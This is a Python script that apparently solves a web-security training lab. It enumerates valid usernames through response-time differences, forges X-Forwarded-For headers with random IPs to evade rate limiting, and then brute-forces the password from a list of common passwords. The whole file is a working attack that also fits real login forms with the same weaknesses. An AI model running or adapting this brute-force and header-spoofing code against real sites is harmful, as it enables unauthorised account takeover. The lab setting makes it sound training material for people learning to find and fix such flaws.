```python
import requests
import os
from urllib3.exceptions import InsecureRequestWarning
import random
import sys
import time

#>>> ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(100))
fakepass = 'PD0RFTUGSQ8TTSWMB72VHC5QCGFMXBNHPIAN28TKWZSE7LIFK77Q2921KQ2OLJA5QSE88K7V2Z49HI4AVHJ7RZ6UPRH9R4W8SBLJ'

url = 'https://0a5500f10481cbee80b0daa000a30094.web-security-academy.net/login'

userlist = ['carlos','root','admin','test','guest','info','adm','mysql','user','administrator','oracle','ftp','pi','puppet','ansible','ec2-user','vagrant','azureuser','academico','acceso','access','accounting','accounts','acid','activestat','ad','adam','adkit','admin','administracion','administrador','administrator','administrators','admins','ads','adserver','adsl','ae','af','affiliate','affiliates','afiliados','ag','agenda','agent','ai','aix','ajax','ak','akamai','al','alabama','alaska','albuquerque','alerts','alpha','alterwind','am','amarillo','americas','an','anaheim','analyzer','announce','announcements','antivirus','ao','ap','apache','apollo','app','app01','app1','apple','application','applications','apps','appserver','aq','ar','archie','arcsight','argentina','arizona','arkansas','arlington','as','as400','asia','asterix','at','athena','atlanta','atlas','att','au','auction','austin','auth','auto','autodiscover']

invalidusers = ['amilcare', 'barbagianni', 'marcobrando', 'agostella', 'wiener']

passwords = ['123456','password','12345678','qwerty','123456789','12345','1234','111111','1234567','dragon','123123','baseball','abc123','football','monkey','letmein','shadow','master','666666','qwertyuiop','123321','mustang','1234567890','michael','654321','superman','1qaz2wsx','7777777','121212','000000','qazwsx','123qwe','killer','trustno1','jordan','jennifer','zxcvbnm','asdfgh','hunter','buster','soccer','harley','batman','andrew','tigger','sunshine','iloveyou','2000','charlie','robert','thomas','hockey','ranger','daniel','starwars','klaster','112233','george','computer','michelle','jessica','pepper','1111','zxcvbn','555555','11111111','131313','freedom','777777','pass','maggie','159753','aaaaaa','ginger','princess','joshua','cheese','amanda','summer','love','ashley','nicole','chelsea','biteme','matthew','access','yankees','987654321','dallas','austin','thunder','taylor','matrix','mobilemail','mom','monitor','monitoring','montana','moon','moscow']

# if you want to see your requests in Burpsuite
proxies = { 'http': 'http://localhost:8080',
            'https': 'http://localhost:8080'
          }

# Suppress the warnings from urllib3
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def test_if_user_exists(user):
    src_ip = genera_ip()
    data = { 'username': user, 'password': fakepass }
    headers = { 'Content-Type': 'application/x-www-form-urlencoded', "X-Forwarded-For": src_ip }
    r = requests.post(url, data=data, headers=headers, verify=False)
    #print("Testing user: " + user + " with src ip: " + src_ip)
    #print("Elapsed time:" + str(r.elapsed.total_seconds()))
    line_new = '{:<30} {:<30} {:<30}'.format(user, src_ip, str(r.elapsed.total_seconds()))
    print(line_new)
    global tempo
    global userok
    tempo = r.elapsed.total_seconds()
    userok = user
    return tempo

def test_if_password_correct(userok, password):
    src_ip = genera_ip()
    data = { 'username': userok, 'password': password }
    headers = { 'Content-Type': 'application/x-www-form-urlencoded', "X-Forwarded-For": src_ip }
    r = requests.post(url, data=data, headers=headers)
    if 'Invalid username or password' in r.text:
        line_new = '{:<30} {:<30} {:<30}'.format(winner, password, "Invalid password")
        print(line_new)
    else:
        print("Found password: " + password)
        global passok
        passok = password
        return True

def genera_ip():
    return(str(random.randint(1, 255))+'.'+str(random.randint(1, 255))+'.'+str(random.randint(1, 255))+'.'+str(random.randint(1, 255)))

#happy case with correct credentials
print("\nLet's make a successful connection with correct credentials...\n")
time.sleep(2)
data = { 'username': 'wiener', 'password': 'peter' }
headers = { 'Content-Type': 'application/x-www-form-urlencoded', "X-Forwarded-For": genera_ip() }
r = requests.post(url, data=data, headers=headers)
print("Successful login's response time: " + str(r.elapsed.total_seconds()) +"\n")

#print(type(r.elapsed.total_seconds()))
time.sleep(2)

#bad case with correct username but wrong password
print("Now, let's make a connection with correct username but WRONG password...\n")
time.sleep(2)
data = { 'username': 'wiener', 'password': fakepass }
headers = { 'Content-Type': 'application/x-www-form-urlencoded', "X-Forwarded-For": genera_ip() }

r = requests.post(url, data=data, headers=headers)

print("Unsuccessful login's (but with CORRECT username) response time: " + str(r.elapsed.total_seconds()))

#print(type(r.elapsed.total_seconds()))
time.sleep(2)

print("So, we are looking for responses with about " + str(r.elapsed.total_seconds()) + " milliseconds...\n")

print("Let's assume that when we found a correct username, it takes more than 0.60 milliseconds...\n")

time.sleep(2)

print("Testing users...\n")
print('{:<30} {:<30} {:<30}'.format("Username", "Fake Source IP", "Response time"))

for i in range(len(userlist)):
    test_if_user_exists(userlist[i])
    if tempo > 0.60:
        print("This is user is probably the winner: " + userlist[i])
        winner = userlist[i]
        break

time.sleep(2)
print("Now we try to brute force password for user: " +winner)
print("Testing passwords...\n")
print('{:<30} {:<30} {:<30}'.format("Username", "Password", "Result"))

for i in range(len(passwords)):
    if test_if_password_correct(userok, passwords[i]) == True:
        winnerpass = passwords[i]
        break

time.sleep(2)

print("LAB solved with user: "+winner+" and password: "+winnerpass)
```